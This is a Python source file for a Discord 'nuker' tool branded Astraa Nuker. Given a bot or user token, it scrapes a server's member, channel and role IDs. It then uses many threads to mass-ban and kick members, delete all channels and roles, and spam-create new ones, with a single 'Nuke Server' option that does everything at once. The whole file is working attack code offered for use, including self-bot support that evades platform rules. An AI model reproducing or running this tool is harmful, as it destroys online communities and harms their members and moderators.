import requests
import os
import sys
import threading
import time
import json
import asyncio
import discord
import aiohttp
from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from colorama import Fore

os.system(f'cls & mode 85,20 & title [Astraa Nuker] - Configuration')

print(f"""\n{Fore.LIGHTWHITE_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTWHITE_EX }] Enter the token of the bot you will use to execute the RAID commands: """)
token = input(f"""{Fore.LIGHTWHITE_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTWHITE_EX }] Bot token: """)
print(f"""\n{Fore.LIGHTWHITE_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTWHITE_EX }] Do you want to activate the rich presence: """)
rich_presence = input(f"""{Fore.LIGHTWHITE_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTWHITE_EX }] Rich Presence (Y/N): """)

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("816053514584195073") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="averylarge2", small_image="avery", large_text="github.com/AstraaDev", start=time.time())
        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Nuker:

    def __init__(self):
        self.colour = Fore.LIGHTBLUE_EX

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Banned {member.strip()}")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Kicked {member.strip()}")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Deleted Channel {channel.strip()}")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Deleted Role {role.strip()}")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Created Channel {name}")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTWHITE_EX }[{self.colour}+{Fore.LIGHTWHITE_EX }] Created Role {name}")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        try:
            os.remove("temp/Scraped/members.txt")
            os.remove("temp/Scraped/channels.txt")
            os.remove("temp/Scraped/roles.txt")
        except:
            pass

        membercount = 0
        with open('temp/Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Scraped {membercount} Members")
            m.close()

        channelcount = 0
        with open('temp/Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Scraped {channelcount} Channels")
            c.close()

        rolecount = 0
        with open('temp/Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Scraped {rolecount} Roles")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        channel_name = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Channel Names: ")
        channel_amount = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Channel Amount: ")
        role_name = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Role Names: ")
        role_amount = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Role Amount: ")
        print()

        members = open('temp/Scraped/members.txt')
        channels = open('temp/Scraped/channels.txt')
        roles = open('temp/Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        print()
        members = open('temp/Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        print()
        members = open('temp/Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        print()
        channels = open('temp/Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        print()
        roles = open('temp/Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        name = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Channel Names: ")
        amount = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Amount: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        name = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Role Names: ")
        amount = input(f"{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Amount: ")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Guild ID: ')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    def Credits(self):
        os.system(f'cls & mode 85,20 & title [Astraa Nuker] - Credits')
        print(f'''
                         {self.colour}╔═╗╔═╗╔╦╗╦═╗╔═╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                         \033[90m╠═╣╚═╗ ║ ╠╦╝╠═╣╠═╣  ║║║║ ║╠╩╗║╣ ╠╦╝
                         \033[37m╩ ╩╚═╝ ╩ ╩╚═╩ ╩╩ ╩  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\n\n

                              {self.colour}[\033[37mGithub{self.colour}]  \033[37mAstraaDev
                              {self.colour}[\033[37mWebSite{self.colour}] \033[37mastraadev.club
                              {self.colour}[\033[37mServer{self.colour}]  \033[37mdiscord.gg/pUZrFnabvd\n
                              {self.colour}[\033[37mTwitter{self.colour}] \033[37m@AstraaDev
                              {self.colour}[\033[37mDiscord{self.colour}] \033[37mAstraa#4589
                              {self.colour}[\033[37mInsta{self.colour}]   \033[37m@astraaftn
    \033[37m''')

    async def ThemeChanger(self):
        os.system(f'cls & mode 85,20 & title [Astraa Nuker] - Themes')
        print(f'''
                         {self.colour}╔═╗╔═╗╔╦╗╦═╗╔═╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                         \033[90m╠═╣╚═╗ ║ ╠╦╝╠═╣╠═╣  ║║║║ ║╠╩╗║╣ ╠╦╝
                         \033[37m╩ ╩╚═╝ ╩ ╩╚═╩ ╩╩ ╩  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\n\n
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{Fore.LIGHTRED_EX}1\033[37m] \033[37mRed               {self.colour}║\033[37m [\x1b[38;5;56m5\033[37m] \033[37mPurple            {self.colour}║\033[37m [\x1b[38;5;103m9\033[37m] \033[37mGrey              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{Fore.LIGHTGREEN_EX}2\033[37m] \033[37mGreen             {self.colour}║\033[37m [{Fore.LIGHTBLUE_EX}6\033[37m] \033[37mBlue              {self.colour}║\033[37m [\x1b[38;5;209m0\033[37m] \033[37mPeach             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{Fore.LIGHTYELLOW_EX}3\033[37m] \033[37mYellow            {self.colour}║\033[37m [\x1b[38;5;201m7\033[37m] \033[37mPink              {self.colour}║\033[37m [{Fore.LIGHTWHITE_EX}M\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}║ \033[37m[\x1b[38;5;172m4\033[37m] \033[37mOrange            {self.colour}║\033[37m [\x1b[38;5;51m8\033[37m] \033[37mCyan              {self.colour}║\033[37m [{Fore.LIGHTWHITE_EX}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')
        choice = input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Choice: """)

        if choice == '1':
            self.colour = Fore.LIGHTRED_EX
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = Fore.LIGHTGREEN_EX
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = Fore.LIGHTYELLOW_EX
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = Fore.LIGHTBLUE_EX
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [Astraa Nuker] - Connected: {client.user}')
        print(f'''
                         {self.colour}╔═╗╔═╗╔╦╗╦═╗╔═╗╔═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                         \033[90m╠═╣╚═╗ ║ ╠╦╝╠═╣╠═╣  ║║║║ ║╠╩╗║╣ ╠╦╝
                         \033[37m╩ ╩╚═╝ ╩ ╩╚═╩ ╩╩ ╩  ╝╚╝╚═╝╩ ╩╚═╝╩╚═\n\n
      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ {Fore.LIGHTWHITE_EX }[{self.colour}1{Fore.LIGHTWHITE_EX }] \033[37mBan Members       {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}5{Fore.LIGHTWHITE_EX }] \033[37mDelete Channels   {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}9{Fore.LIGHTWHITE_EX }] \033[37mScrape Info       {self.colour}║\033[37m
      {self.colour}║ {Fore.LIGHTWHITE_EX }[{self.colour}2{Fore.LIGHTWHITE_EX }] \033[37mKick Members      {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}6{Fore.LIGHTWHITE_EX }] \033[37mCreate Roles      {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}0{Fore.LIGHTWHITE_EX }] \033[37mChange Themes     {self.colour}║\033[37m
      {self.colour}║ {Fore.LIGHTWHITE_EX }[{self.colour}3{Fore.LIGHTWHITE_EX }] \033[37mPrune Members     {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}7{Fore.LIGHTWHITE_EX }] \033[37mCreate Channels   {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}C{Fore.LIGHTWHITE_EX }] \033[37mView Credits      {self.colour}║\033[37m
      {self.colour}║ {Fore.LIGHTWHITE_EX }[{self.colour}4{Fore.LIGHTWHITE_EX }] \033[37mDelete Roles      {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}8{Fore.LIGHTWHITE_EX }] \033[37mNuke Server       {self.colour}║\033[37m {Fore.LIGHTWHITE_EX }[{self.colour}X{Fore.LIGHTWHITE_EX }] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')

        choice = input(f"""{Fore.LIGHTWHITE_EX }[{self.colour}#{Fore.LIGHTWHITE_EX }] Choice: """)
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await self.PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        await Nuker().Menu()
            
    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f"""{Fore.LIGHTWHITE_EX }[{Fore.LIGHTRED_EX }#{Fore.LIGHTWHITE_EX }] Invalid Token""")
            input()
            os._exit(0)

if __name__ == "__main__":
    Nuker().Startup()